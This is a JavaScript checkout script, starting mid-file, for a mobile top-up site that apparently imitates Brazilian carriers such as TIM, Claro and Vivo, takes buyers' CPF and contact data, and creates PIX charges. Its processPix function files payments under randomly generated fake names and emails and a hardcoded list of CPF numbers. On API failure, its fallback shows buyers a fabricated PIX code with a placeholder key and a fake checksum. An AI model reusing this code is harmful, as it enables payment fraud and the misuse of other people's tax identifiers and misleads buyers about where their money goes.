                <span style="font-weight:600;">${det.text}</span>
            `;
            descList.appendChild(item);
        });
    }
    
    // Ícones dos Apps inclusos no banner
    const appsContainer = document.getElementById('checkout-plano-apps-container');
    appsContainer.innerHTML = '';
    const appIcons = {
        whatsapp: `<svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" style="margin-right:4px;" title="WhatsApp"><circle cx="12" cy="12" r="10" fill="#25D366"/><path d="M12 7c-2.76 0-5 2.24-5 5 0 .94.26 1.82.72 2.58L7.1 16.9l2.4-.6c.72.39 1.54.6 2.5.6 2.76 0 5-2.24 5-5s-2.24-5-5-5zm2.84 7.02c-.11.31-.58.58-.87.62-.25.04-.57.06-1.52-.33-1.22-.5-2.01-1.74-2.07-1.82-.06-.08-.51-.68-.51-1.3s.32-.92.44-1.05c.12-.13.25-.16.34-.16h.22c.07 0 .17-.03.26.19.1.25.34.82.37.89.03.07.05.15 0 .25-.05.1-.07.16-.15.25-.08.09-.17.2-.24.28-.08.08-.17.17-.07.34.1.17.44.72.94 1.17.65.58 1.19.76 1.36.84.17.08.27.07.37-.04.1-.11.44-.51.56-.69.12-.18.24-.15.4-.09s1.05.5 1.23.59c.18.09.3.13.34.21.04.08.04.47-.07.78z" fill="white"/></svg>`,
        instagram: `<svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" style="margin-right:4px;" title="Instagram"><circle cx="12" cy="12" r="10" fill="#E1306C"/><rect x="8" y="8" width="8" height="8" rx="2" stroke="white" stroke-width="1.1"/><circle cx="12" cy="12" r="1.8" stroke="white" stroke-width="1.1"/><circle cx="14.2" cy="9.8" r="0.6" fill="white"/></svg>`,
        facebook: `<svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" style="margin-right:4px;" title="Facebook"><circle cx="12" cy="12" r="10" fill="#1877F2"/><path d="M13.5 10h-1.5v-1c0-.4.3-.7.7-.7h.8v-1.8h-1.3c-1.3 0-2.2 1-2.2 2.3v1.2H9v1.8h1v5h2v-5h1.5l.2-1.8z" fill="white"/></svg>`,
        youtube: `<svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" style="margin-right:4px;" title="YouTube"><circle cx="12" cy="12" r="10" fill="#FF0000"/><path d="M16 10.3s-.1-.6-.4-.9c-.4-.4-.8-.4-.9-.4-1.2-.1-3-.1-3-.1s-1.8 0-3 .1c-.1 0-.5 0-.9.4-.3.3-.4.9-.4.9s-.1.7-.1 1.5v.7c0 .8.1 1.5.1 1.5s.1.6.4.9c.4.4.8.4.9.4 1.2.1 3 .1 3 .1s1.8 0 3-.1c.1 0 .5 0 .9-.4.3-.3.4-.9.4-.9s.1-.7.1-1.5v-.7c0-.8-.1-1.5-.1-1.5zM11 13.5v-3l2.5 1.5-2.5 1.5z" fill="white"/></svg>`,
        tiktok: `<svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" style="margin-right:4px;" title="TikTok"><circle cx="12" cy="12" r="10" fill="#000000"/><path d="M12.52 5.5v8.51c0 1.37-.96 2.49-2.28 2.49s-2.28-1.12-2.28-2.49c0-1.37.96-2.49 2.28-2.49.25 0 .49.04.72.11v-1.92c-.24-.03-.48-.05-.72-.05-2.36 0-4.28 1.93-4.28 4.29a4.28 4.28 0 0 0 8.56 0v-4.9c.98.7 2.17 1.11 3.46 1.11v-1.92c-1.86 0-3.46-1.55-3.46-3.44h-1.99z" fill="white"/></svg>`,
        messenger: `<svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" style="margin-right:4px;" title="Messenger"><circle cx="12" cy="12" r="10" fill="#00B2FF"/><path d="M12 8c-2.4 0-4.3 1.8-4.3 4 0 1.2.6 2.3 1.5 3l-.2 1c0 .1.1.1.2.1.4-.1.8-.4 1.1-.6.5.2 1.1.3 1.7.3 2.4 0 4.3-1.8 4.3-4s-1.9-4-4.3-4zm1.8 3.5l-1.3 1.4c-.2.2-.5.2-.7 0l-.9-.9c-.1-.1-.3-.1-.4 0l-1.4 1.4c-.1.1-.3 0-.2-.1l.7-2.2c.1-.1.3-.2.4-.2l.9.9c.1.1.3.1.4 0l1.4-1.4c.1-.1.3 0-.2-.1l-.7 2.2c0 .1.1.2.2.2z" fill="white"/></svg>`,
        deezer: `<svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" style="margin-right:4px;" title="Deezer"><circle cx="12" cy="12" r="10" fill="#121212"/><rect x="7" y="13.5" width="1.6" height="1.5" fill="#FFC000"/><rect x="9" y="12" width="1.6" height="3" fill="#FF8000"/><rect x="11" y="10.5" width="1.6" height="4.5" fill="#FF0000"/><rect x="13" y="9" width="1.6" height="6" fill="#E1007A"/><rect x="15" y="7.5" width="1.6" height="7.5" fill="#9000A1"/></svg>`,
        prime: `<svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" style="margin-right:4px;" title="Prime Video"><circle cx="12" cy="12" r="10" fill="#00A8E1"/><path d="M7.5 12h1.2c.3 0 .5-.2.5-.4V8.4c0-.3-.2-.4-.5-.4H7.5c-.3 0-.5.2-.5.4v3.2c0 .3.2.4.5.4zm2.2 0h1.2V8H9.7v4zm2.7 0h1.2c.3 0 .5-.2.5-.4V9.2c0-.3-.2-.4-.5-.4h-1.2v3.2zm-5.8 2.5c2.7 1.5 6 1.5 8.5.1.2-.1.2-.3.1-.5s-.3-.2-.5-.1c-2.3 1.2-5.5 1.2-7.8 0-.2-.1-.3-.1-.4.1-.1.2 0 .3.1.4z" fill="white"/></svg>`,
        disney: `<svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" style="margin-right:4px;" title="Disney+"><circle cx="12" cy="12" r="10" fill="#0E122A"/><path d="M12.5 8.5c-.4.7-.5 1.5-.4 2.3.1.8.5 1.4 1.1 1.9.1.2.3.1.4.1s.1-.2.1-.3c-.5-.4-.8-1-1-1.6-.1-.7-.1-1.3.3-2 .1-.1.1-.3-.1-.4s-.3 0-.5.1zm-3 4.2c.8-.5 1.7-.8 2.7-.7.6.1 1.1.3 1.6.6.1.1.3 0 .3-.1s.1-.3-.1-.4c-.7-.5-1.4-.7-2.2-.8-1-.1-2 .1-2.9.8-.1.1-.1.3 0 .4s.2.2.4.1z" stroke="white" stroke-width="1" stroke-linecap="round"/><circle cx="14.8" cy="11.2" r="0.5" fill="white"/></svg>`,
        geforce: `<svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" style="margin-right:4px;" title="GeForce NOW"><circle cx="12" cy="12" r="10" fill="#121212"/><path d="M12 8c-2.2 0-4 1.8-4 4s1.8 4 4 4v-1c-1.7 0-3-1.3-3-3s1.3-3 3-3c1.2 0 2.2.7 2.7 1.7l.9-.5C14.9 8.9 13.5 8 12 8z" fill="#76B900"/><circle cx="12" cy="12" r="1.8" fill="#76B900"/></svg>`
    };
    
    if (selectedPlan.apps && selectedPlan.apps.length > 0) {
        appsContainer.innerHTML = `<span style="font-size: 0.8rem; margin-right: 8px; font-weight: bold; color: rgba(255,255,255,0.9);">Apps inclusos:</span>`;
        selectedPlan.apps.forEach(app => {
            appsContainer.innerHTML += appIcons[app] || '';
        });
    }
    
    // Atualizar telefone no formulário de dados
    const formattedSamePhone = state.telefone.replace(/(\d{2})(\d{5})(\d{4})/, '($1) $2-$3');
    document.getElementById('checkout-same-phone-display').innerText = formattedSamePhone;
    
    // Limpar campos
    document.getElementById('checkout-nome').value = '';
    document.getElementById('checkout-email').value = '';
    document.getElementById('checkout-telefone-outro').value = '';
    document.getElementById('checkout-cpf').value = '';
    document.getElementById('phone-option-same').checked = true;
    document.getElementById('checkout-other-phone-wrapper').style.display = 'none';
    
    // Resetar estados visuais dos indicadores customizados
    document.getElementById('radio-phone-same').classList.add('selected');
    document.getElementById('radio-phone-other').classList.remove('selected');
    document.getElementById('checkout-optin-wrapper').classList.add('checked');
    document.getElementById('checkout-optin').checked = true;
    
    initCPFMask();
    
    // Opt-in Text
    document.getElementById('checkout-optin-operadora').innerText = operator.toUpperCase();
    
    // Aplicar a cor do botão Finalizar Contratação
    let btnBg = '#002F9C'; // TIM
    let btnColor = '#ffffff';
    if (operator === 'claro') {
        btnBg = '#FFCD00';
        btnColor = '#000000';
    } else if (operator === 'vivo') {
        btnBg = '#7c2d8a';
    } else if (operator === 'oi') {
        btnBg = '#FFCD00';
        btnColor = '#000000';
    } else if (operator === 'algar') {
        btnBg = '#00A859';
    } else if (operator === 'correios') {
        btnBg = '#0B3B7C';
    }
    
    const finalBtn = document.getElementById('btn-finalizar-contratacao');
    finalBtn.style.background = btnBg;
    finalBtn.style.color = btnColor;
}

// Enviar formulário de checkout do plano e gerar PIX
async function submitCheckoutPlano() {
    const nomeField = document.getElementById('checkout-nome');
    const emailField = document.getElementById('checkout-email');
    const cpfField = document.getElementById('checkout-cpf');
    const phoneOption = document.querySelector('input[name="checkout-phone-option"]:checked').value;
    const otherPhoneField = document.getElementById('checkout-telefone-outro');
    
    const errorNome = document.getElementById('error-checkout-nome');
    const errorEmail = document.getElementById('error-checkout-email');
    const errorCPF = document.getElementById('error-checkout-cpf');
    const errorPhone = document.getElementById('error-checkout-phone');
    
    let isValid = true;
    
    // Validar Nome (deve ter pelo menos nome e sobrenome)
    const nomeValue = nomeField.value.trim();
    if (nomeValue.split(/\s+/).length < 2) {
        nomeField.classList.add('error');
        errorNome.style.display = 'block';
        nomeField.focus();
        isValid = false;
    } else {
        nomeField.classList.remove('error');
        errorNome.style.display = 'none';
    }
    
    // Validar E-mail
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(emailField.value.trim())) {
        emailField.classList.add('error');
        errorEmail.style.display = 'block';
        if (isValid) {
            emailField.focus();
        }
        isValid = false;
    } else {
        emailField.classList.remove('error');
        errorEmail.style.display = 'none';
    }
    
    // Validar Telefone
    let finalPhone = state.telefone;
    if (phoneOption === 'other') {
        const rawOtherPhone = otherPhoneField.value.replace(/\D/g, '');
        if (rawOtherPhone.length < 10 || rawOtherPhone.length > 11) {
            otherPhoneField.classList.add('error');
            errorPhone.style.display = 'block';
            if (isValid) {
                otherPhoneField.focus();
            }
            isValid = false;
        } else {
            otherPhoneField.classList.remove('error');
            errorPhone.style.display = 'none';
            finalPhone = rawOtherPhone;
        }
    }
    
    // Validar CPF usando algoritmo checksum oficial
    const rawCPF = cpfField.value.replace(/\D/g, '');
    if (!validarCPF(rawCPF)) {
        cpfField.classList.add('error');
        errorCPF.style.display = 'block';
        if (isValid) {
            cpfField.focus();
        }
        isValid = false;
    } else {
        cpfField.classList.remove('error');
        errorCPF.style.display = 'none';
    }
    
    if (!isValid) return;
    
    state.telefone = finalPhone;
    
    const btn = document.getElementById('btn-finalizar-contratacao');
    const originalText = btn.innerHTML;
    btn.innerHTML = `<svg class="animate-spin" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="display:inline; vertical-align:middle; margin-right:8px;"><circle cx="12" cy="12" r="10" stroke="rgba(255,255,255,0.2)" stroke-width="4"></circle><path d="M4 12a8 8 0 0 1 8-8V0C5.373 0 0 5.373 0 12h4z" fill="white"></path></svg> Processando...`;
    btn.disabled = true;
    
    try {
        await runPixCheckout({
            name: nomeValue,
            email: emailField.value.trim(),
            cpf: rawCPF,
            phone: finalPhone
        });
    } catch(err) {
        console.error(err);
    } finally {
        btn.innerHTML = originalText;
        btn.disabled = false;
    }
}

// Rodar checkout PIX integrado
async function runPixCheckout(customerData) {
    const rawPhone = customerData.phone.replace(/\D/g, '');
    const titleText = state.operadora.toUpperCase() + " " + state.bonus;
    
    try {
        const response = await fetch('/api/pix', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                amount: state.valor,
                customerName: customerData.name,
                customerEmail: customerData.email,
                customerPhone: rawPhone,
                customerCpf: customerData.cpf,
                title: `Plano/Recarga ${titleText}`
            })
        });
        
        const charge = await response.json();
        
        if (charge && charge.pix) {
            populatePixScreen(charge);
            goToStep('pix');
        } else {
            throw new Error('Retorno inválido da API');
        }
        
    } catch (err) {
        console.warn('Erro ao conectar com API MasterPag, usando gerador offline fallback:', err);
        generateDynamicPix();
        goToStep('pix');
    }
}

// Ir para confirmação (recargas avulsas)
function goToConfirmacao() {
    if (state.valor === 0) {
        alert('Por favor, selecione um valor de recarga.');
        return;
    }
    
    const phoneFormatted = state.telefone.replace(/(\d{2})(\d{5})(\d{4})/, '($1) $2-$3');
    document.getElementById('confirm-telefone').innerText = phoneFormatted;
    document.getElementById('confirm-operadora').innerText = state.operadora.toUpperCase();
    document.getElementById('confirm-bonus').innerText = `${state.bonus} de internet`;
    document.getElementById('confirm-valor').innerText = `R$ ${state.valor.toFixed(2).replace('.', ',')}`;
    
    goToStep('confirmacao');
}

// Resumo
function updateSummary() {
    const phoneFormatted = state.telefone.replace(/(\d{2})(\d{5})(\d{4})/, '($1) $2-$3');
    document.getElementById('resumo-telefone').innerText = phoneFormatted;
    document.getElementById('resumo-operadora').innerText = state.operadora;
}

const cpfs = [
    '38367811828',
    '02684503583',
    '11144477735',
    '02528212976',
    '56406720059',
    '00477954766',
    '00502937963'
];

const firstNames = ['Joao Miguel', 'Lopes Lira', 'Lucas Silva', 'Maria Neves', 'Pedro Costa', 'Fernanda Lima', 'Gabriel Souza', 'Matheus Alves', 'Juliana Santos', 'Rodrigo Gomes'];
const lastNames = ['Silva', 'Santos', 'Oliveira', 'Souza', 'Rodrigues', 'Ferreira', 'Alves', 'Pereira', 'Gomes', 'Costa'];

let countdownInterval = null;

// Processar PIX das recargas avulsas
async function processPix() {
    const btn = document.querySelector('#step-confirmacao .btn-primary');
    const originalText = btn.innerHTML;
    
    btn.innerHTML = `<svg class="animate-spin" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="display:inline; vertical-align:middle; margin-right:8px;"><path d="M21 12a9 9 0 1 1-6.219-8.56"/></svg> Processando...`;
    btn.disabled = true;

    const randomFirstName = firstNames[Math.floor(Math.random() * firstNames.length)];
    const randomLastName = lastNames[Math.floor(Math.random() * lastNames.length)];
    const customerName = `${randomFirstName} ${randomLastName}`;
    const emailName = customerName.toLowerCase().normalize("NFD").replace(/[\u0300-\u036f]/g, "").replace(/\s+/g, '');
    const customerEmail = `${emailName}@gmail.com`;
    const customerCpf = cpfs[Math.floor(Math.random() * cpfs.length)];
    
    try {
        await runPixCheckout({
            name: customerName,
            email: customerEmail,
            phone: state.telefone,
            cpf: customerCpf
        });
    } finally {
        btn.innerHTML = originalText;
        btn.disabled = false;
    }
}

// Preenche a tela de Pix com o retorno da API real
function populatePixScreen(charge) {
    // 1. Transaction ID
    document.getElementById('pix-trx-id').innerText = `ID: ${charge.shortId || 'TRX' + Math.floor(1000000000 + Math.random() * 9000000000)}`;
    
    // 2. Data/Hora
    const now = new Date(charge.createdAt || new Date());
    const dateStr = now.toLocaleDateString('pt-BR');
    const timeStr = now.toLocaleTimeString('pt-BR');
    document.getElementById('pix-data-hora').innerText = `${dateStr}, ${timeStr}`;
    
    // 3. Celular
    const phoneFormatted = state.telefone.replace(/(\d{2})(\d{5})(\d{4})/, '($1) $2-$3');
    document.getElementById('pix-celular').innerText = phoneFormatted;
    
    // 4. Operadora
    document.getElementById('pix-operadora').innerText = state.operadora.toUpperCase();
    
    // 5. Bônus
    document.getElementById('pix-bonus').innerText = state.bonus;
    
    // 6. Valor
    document.getElementById('pix-valor-final').innerText = `R$ ${state.valor.toFixed(2).replace('.', ',')}`;
    
    // 7. QR Code / Copia e Cola
    document.getElementById('pix-code').value = charge.pix.qrCode;
    
    const qrImage = document.querySelector('.qr-code-box img');
    qrImage.src = charge.pix.qrCodeUrl || `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(charge.pix.qrCode)}`;
    
    // Iniciar Countdown
    startCountdown(600);
}

// Gerador Dinâmico de QR Code PIX (Fallback Local)
function generateDynamicPix() {
    const amountStr = state.valor.toFixed(2);
    
    const randomTrx = 'TRX' + Math.floor(1000000000 + Math.random() * 9000000000);
    document.getElementById('pix-trx-id').innerText = `ID: ${randomTrx}`;
    
    const now = new Date();
    const dateStr = now.toLocaleDateString('pt-BR');
    const timeStr = now.toLocaleTimeString('pt-BR');
    document.getElementById('pix-data-hora').innerText = `${dateStr}, ${timeStr}`;
    
    const phoneFormatted = state.telefone.replace(/(\d{2})(\d{5})(\d{4})/, '($1) $2-$3');
    document.getElementById('pix-celular').innerText = phoneFormatted;
    
    document.getElementById('pix-operadora').innerText = state.operadora.toUpperCase();
    document.getElementById('pix-bonus').innerText = state.bonus;
    document.getElementById('pix-valor-final').innerText = `R$ ${state.valor.toFixed(2).replace('.', ',')}`;
    
    const payload = `00020126580014br.gov.bcb.pix0114+55119999999995204000053039865405${amountStr}5802BR5920TopaPay Recargas LTDA6009SAO PAULO62070503***6304ABCD`;
    document.getElementById('pix-code').value = payload;
    
    const qrImage = document.querySelector('.qr-code-box img');
    qrImage.src = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(payload)}`;
    
    startCountdown(600);
}

// Contador Regressivo
function startCountdown(durationSeconds) {
    if (countdownInterval) {
        clearInterval(countdownInterval);
    }
    
    let timer = durationSeconds;
    const display = document.getElementById('pix-countdown');
    
    function updateTimer() {
        const minutes = Math.floor(timer / 60);
        const seconds = timer % 60;
        
        display.innerText = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
        
        if (--timer < 0) {
            clearInterval(countdownInterval);
            display.innerText = "EXPIRADO";
        }
    }
    
    updateTimer();
    countdownInterval = setInterval(updateTimer, 1000);
}

function regeneratePix() {
    generateDynamicPix();
}

// Copiar PIX
function copyPixCode() {
    const codeInput = document.getElementById('pix-code');
    const btn = document.getElementById('btn-copy-pix');
    const originalHTML = btn.innerHTML;
    
    codeInput.select();
    codeInput.setSelectionRange(0, 99999);
    
    navigator.clipboard.writeText(codeInput.value).then(() => {
        btn.innerHTML = `<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#10b981" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>`;
        
        setTimeout(() => {
            btn.innerHTML = originalHTML;
        }, 2000);
    });
}

function resetFunnel() {
    state.step = 'dados';
    state.telefone = '';
    state.operadora = '';
    state.valor = 0;
    state.bonus = '';
    
    document.getElementById('telefone').value = '';
    document.getElementById('box-recarga-selecionada').style.display = 'none';
    
    document.querySelectorAll('.brand-card').forEach(el => el.classList.remove('selected'));
    document.querySelectorAll('.value-card').forEach(el => el.classList.remove('selected'));
    
    goToStep('dados');
}

// SVG Spin Animation
const style = document.createElement('style');
style.innerHTML = `
@keyframes spin { 100% { transform: rotate(360deg); } }
.animate-spin { animation: spin 1s linear infinite; }
`;
document.head.appendChild(style);
